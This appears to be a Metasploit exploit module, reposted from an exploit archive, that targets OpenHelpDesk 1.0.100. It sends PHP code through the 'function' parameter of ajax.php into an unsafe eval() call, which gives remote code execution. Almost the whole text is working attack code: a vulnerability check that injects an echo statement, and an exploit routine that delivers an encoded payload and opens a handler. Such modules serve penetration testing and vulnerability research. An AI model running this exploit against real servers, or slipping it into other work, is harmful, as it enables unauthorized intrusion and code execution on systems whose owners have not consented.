OpenHelpDesk 1.0.100 eval() Code Execution Exploit (meta)
=========================================================


##
# $Id: php_eval.rb 5783 2008-10-23 02:43:21Z ramon $
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require &#039;msf/core&#039;


class Metasploit3 < Msf::Exploit::Remote

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,	
			&#039;Description&#039;    => %q{
				OpenHelpDesk version 1.0.100 is vulnerable to a php code
				execution vulnerability due to improper use of eval().
				The php.ini register_globals directive is *not* required to be
				on to exploit this vulnerability.  There is no known public
				exploit for this vulnerability.
			},
			&#039;Author&#039;         => [ &#039;LSO <lso@hushmail.com>&#039; ],
			&#039;License&#039;        => BSD_LICENSE,
			&#039;Version&#039;        => &#039;$Revision$&#039;,
			&#039;References&#039;     => [ &#039;URL&#039; , &#039;http://sourceforge.net/projects/openhelpdesk&#039; ],
			&#039;Privileged&#039;     => false,
			&#039;Platform&#039;       => [&#039;php&#039;],
            &#039;Arch&#039;           => ARCH_PHP,
			&#039;Payload&#039;        => 
				{
					&#039;Space&#039;       => 4000,  # max url length for some old
											# versions of apache according to
											# http://www.boutell.com/newfaq/misc/urllength.html
					&#039;DisableNops&#039; => true,
					&#039;BadChars&#039;    => %q|&#039;"`|,  # quotes are escaped by PHP&#039;s magic_quotes_gpc in a default install
					&#039;Compat&#039;      => 
						{
							&#039;ConnectionType&#039; => &#039;find&#039;,
						},
					&#039;Keys&#039;        => [&#039;php&#039;],
				},
			&#039;Targets&#039;        => [ [&#039;Automatic&#039;, { }], ],
			&#039;DefaultTarget&#039; => 0
			))

		register_options(
			[
				OptString.new(&#039;URIPATH&#039;,   [ true,  "The URI of ajax.php ", &#039;/openhelpdesk/ajax.php&#039;]),
			], self.class)
	
	end

	def check
		tester = rand_text_alpha(10)
		php_code = "echo(&#039;#{tester}&#039;);"

		response = eval_sploit(php_code)

		#print_status(response)
		if (response && response.body.match(tester).to_a.first)
			checkcode = Exploit::CheckCode::Vulnerable
		else
			checkcode = Exploit::CheckCode::Safe
		end
		return checkcode
	end

	def exploit
		response = eval_sploit(payload.encoded)

		handler
	end

	def eval_sploit(php_code)
		uri  = datastore[&#039;URIPATH&#039;] + "?function=" + php_code + "//"
		response = send_request_raw({ &#039;uri&#039; => uri },1)
		return response
	end
end



